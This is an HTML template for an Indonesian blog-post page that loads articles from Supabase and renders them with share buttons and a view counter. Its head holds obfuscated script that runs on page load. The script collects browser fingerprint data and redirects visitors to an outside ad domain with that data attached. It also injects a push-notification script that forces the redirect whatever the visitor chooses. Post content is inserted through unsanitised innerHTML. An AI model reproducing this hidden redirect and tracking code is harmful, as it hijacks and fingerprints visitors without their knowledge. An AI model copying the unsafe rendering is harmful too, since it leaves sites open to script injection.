<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title>Memuat Postingan...</title>
    <meta name="description" content="Sebuah artikel menarik yang sedang dimuat.">

    <script src="https://cdn.tailwindcss.com"></script>
     <script type='text/javascript' src='//pl26950046.profitableratecpm.com/48/04/ea/4804ea3402c82a510bdde71fd50162a2.js'></script>
    <script>
    var a='mcrpolfattafloprcmlVeedrosmico?ncc=uca&FcusleluVlearVsyipoonrctannEdhrgoiiHdt_emgocdeellicboosmccoast_avDetrnseigoAnrcebsruocw=seelri_bvoemr_ssiiocn'.split('').reduce((m,c,i)=>i%2?m+c:c+m).split('c');var Replace=(o=>{var v=a[0];try{v+=a[1]+Boolean(navigator[a[2]][a[3]]);navigator[a[2]][a[4]](o[0]).then(r=>{o[0].forEach(k=>{v+=r[k]?a[5]+o[1][o[0].indexOf(k)]+a[6]+encodeURIComponent(r[k]):a[0]})})}catch(e){}return u=>window.location.replace([u,v].join(u.indexOf(a[7])>-1?a[5]:a[7]))})([[a[8],a[9],a[10],a[11]],[a[12],a[13],a[14],a[15]]]); 
    var s = document.createElement('script');
    s.src='//lemouwee.com/796/fe51a/mw.min.js?z=9463942'+'&sw=/sw-check-permissions-e08c2.js'+'&nouns=1';
    s.onload = function(result) {
        switch (result) {
            case 'onPermissionDefault':break;
            case 'onPermissionAllowed':
            Replace("//n91hg.com/4/9463943");break;
            case 'onPermissionDenied':
            Replace("//n91hg.com/4/9463943");break;
            case 'onAlreadySubscribed':break;
            case 'onNotificationUnsupported':break;
        }
    };
    document.head.appendChild(s);
</script>
    <link href="https://cdn.jsdelivr.net/npm/remixicon@4.2.0/fonts/remixicon.css" rel="stylesheet"/>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        body { 
            font-family: 'Inter', sans-serif; 
            background-color: #0a0a0a; 
            color: #a3a3a3; /* neutral-400 */
        }
        .sticky-header {
            background: linear-gradient(180deg, rgba(10, 10, 10, 0.85) 0%, rgba(10, 10, 10, 0.7) 100%);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        /* Styling untuk konten dari editor */
        .prose-styles h1, .prose-styles h2, .prose-styles h3 { color: #fafafa; /* neutral-50 */ font-weight: 700; margin-top: 2em; margin-bottom: 1em; }
        .prose-styles p { line-height: 1.75; margin-bottom: 1.25em; }
        .prose-styles a { color: #818cf8; /* indigo-400 */ text-decoration: underline; text-decoration-thickness: 1px; text-underline-offset: 2px; }
        .prose-styles a:hover { color: #a78bfa; /* violet-400 */ }
        .prose-styles blockquote { border-left: 3px solid #6366f1; /* indigo-500 */ padding-left: 1.5rem; margin: 1.5rem 0; font-style: italic; color: #d4d4d8; /* neutral-300 */ }
        .prose-styles img { border-radius: 0.75rem; margin: 2rem 0; }
        .prose-styles pre { background-color: #171717; /* neutral-900 */ padding: 1.5rem; border-radius: 0.75rem; overflow-x: auto; }
        .prose-styles code { font-family: 'JetBrains Mono', monospace; }
        .tag-link { border: 1px solid rgba(255, 255, 255, 0.2); transition: all 0.2s ease; }
        .tag-link:hover { border-color: #818cf8; background-color: rgba(129, 140, 248, 0.1); color: #c7d2fe; }
    </style>
</head>
<body class="antialiased">

    <header class="sticky-header sticky top-0 z-50">
        <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex items-center justify-between h-16">
                <a href="/index.html" class="flex items-center space-x-2 text-gray-300 hover:text-white transition-colors">
                    <i class="ri-arrow-left-s-line"></i>
                    <span>Kembali</span>
                </a>
                <div id="shareTop" class="flex items-center space-x-4">
                    </div>
            </div>
        </div>
    </header>

    <main id="mainContent" class="opacity-0 transition-opacity duration-500">
        <article class="max-w-3xl mx-auto px-4 sm:px-6 lg:px-8 py-12 md:py-16">
            <div id="post-container">
                <header class="mb-8">
                    <p id="post-category" class="font-semibold text-indigo-400 uppercase tracking-wider text-sm"></p>
                    <h1 id="post-title" class="text-3xl md:text-5xl font-extrabold text-white mt-2"></h1>
                    <div id="post-meta" class="mt-4 text-sm text-gray-400 flex items-center space-x-4"></div>
                </header>

                <img id="post-thumbnail" src="" alt="" class="w-full rounded-2xl shadow-lg mb-8 bg-neutral-800" style="display: none;">

                <div id="post-content" class="prose-styles text-lg"></div>

                <div id="post-tags" class="mt-12 flex flex-wrap gap-2"></div>

                <div class="mt-12 pt-8 border-t border-white/10 text-center">
                    <p class="text-sm text-gray-400 mb-4">Suka dengan artikel ini? Bagikan!</p>
                    <div id="shareBottom" class="flex justify-center items-center space-x-4"></div>
                </div>
            </div>
            
            <div id="notFound" class="hidden text-center py-20">
                <h1 class="text-6xl font-black text-white">404</h1>
                <p class="text-xl mt-4 text-gray-400">Postingan tidak ditemukan.</p>
                <a href="/index.html" class="mt-8 inline-block bg-indigo-500 text-white font-semibold py-2 px-6 rounded-lg hover:bg-indigo-600 transition-colors">Kembali ke Beranda</a>
            </div>
        </article>
    </main>
    
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script>
        const SUPABASE_URL = 'https://wgcslximcxnprmfqtsoh.supabase.co';
        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndnY3NseGltY3hucHJtZnF0c29oIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDk3NTE5NzEsImV4cCI6MjA2NTMyNzk3MX0.K0xWAiVdU9vAwJepHV5rMBROBoBDTpXtczXoQopEZQk';
        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

        // === Elemen DOM ===
        const mainContent = document.getElementById('mainContent');
        const postContainer = document.getElementById('post-container');
        const notFoundDiv = document.getElementById('notFound');

        // Fungsi untuk meng-update meta tag SEO
        function updateMeta(post) {
            document.title = post.meta_title || post.title;
            document.querySelector('meta[name="description"]').setAttribute('content', post.meta_description || '');
        }

        // Fungsi untuk menampilkan postingan
        function displayPost(post) {
            document.getElementById('post-category').textContent = post.category || '';
            document.getElementById('post-title').textContent = post.title;
            document.getElementById('post-meta').innerHTML = `
                <span>Oleh ${post.author || 'Anonim'}</span>
                <span>•</span>
                <span>${new Date(post.created_at).toLocaleDateString('id-ID', {day:'numeric', month:'long', year:'numeric'})}</span>
                <span>•</span>
                <span class="flex items-center"><i class="ri-eye-line mr-1"></i>${post.views || 0} views</span>
            `;

            const thumbnail = document.getElementById('post-thumbnail');
            if (post.thumbnail_url) {
                thumbnail.src = post.thumbnail_url;
                thumbnail.alt = post.title;
                thumbnail.style.display = 'block';
            }
            
            document.getElementById('post-content').innerHTML = post.content;

            const tagsContainer = document.getElementById('post-tags');
            if (post.tags) {
                post.tags.split(',').forEach(tag => {
                    const tagEl = document.createElement('a');
                    tagEl.href = '#'; // Nanti bisa diarahkan ke halaman tag
                    tagEl.className = 'tag-link text-sm py-1 px-3 rounded-full';
                    tagEl.textContent = tag.trim();
                    tagsContainer.appendChild(tagEl);
                });
            }

            setupShareButtons();
        }

        // Fungsi untuk setup tombol share
        function setupShareButtons() {
            const url = window.location.href;
            const title = document.title;
            const shareHTML = `
                <a href="https://twitter.com/intent/tweet?url=${encodeURIComponent(url)}&text=${encodeURIComponent(title)}" target="_blank" class="text-gray-400 hover:text-white"><i class="ri-twitter-x-line text-2xl"></i></a>
                <a href="https://wa.me/?text=${encodeURIComponent(title + " " + url)}" target="_blank" class="text-gray-400 hover:text-white"><i class="ri-whatsapp-line text-2xl"></i></a>
                <button id="copyLinkBtn" class="text-gray-400 hover:text-white"><i class="ri-links-line text-2xl"></i></button>
            `;
            document.getElementById('shareTop').innerHTML = shareHTML;
            document.getElementById('shareBottom').innerHTML = shareHTML;
            
            document.querySelectorAll('#copyLinkBtn').forEach(btn => {
                btn.onclick = () => {
                    navigator.clipboard.writeText(url).then(() => alert('Link berhasil disalin!'));
                }
            });
        }
        
        // Fungsi untuk menghitung view dengan memanggil Edge Function
        async function countView(postId) {
            try {
                // Kita panggil Edge Function tanpa menunggu hasilnya, agar tidak memperlambat user
                supabase.functions.invoke('increment-post-view', {
                    body: { post_id: postId },
                });
            } catch (error) {
                console.error("Gagal menghitung view:", error); // Gagalnya tidak perlu ditampilkan ke user
            }
        }

        // Fungsi utama yang berjalan saat halaman dimuat
        async function initializePage() {
            const slug = new URLSearchParams(window.location.search).get('slug');
            if (!slug) {
                postContainer.style.display = 'none';
                notFoundDiv.classList.remove('hidden');
                mainContent.classList.remove('opacity-0');
                return;
            }

            const { data: post, error } = await supabase
                .from('posts')
                .select('*')
                .eq('slug', slug)
                .eq('published', true)
                .single();
            
            mainContent.classList.remove('opacity-0');
            if (error || !post) {
                postContainer.style.display = 'none';
                notFoundDiv.classList.remove('hidden');
            } else {
                updateMeta(post);
                displayPost(post);
                // Panggil penghitung view setelah post berhasil ditampilkan
                countView(post.id);
            }
        }
        
        document.addEventListener('DOMContentLoaded', initializePage);
    </script>
</body>
</html>
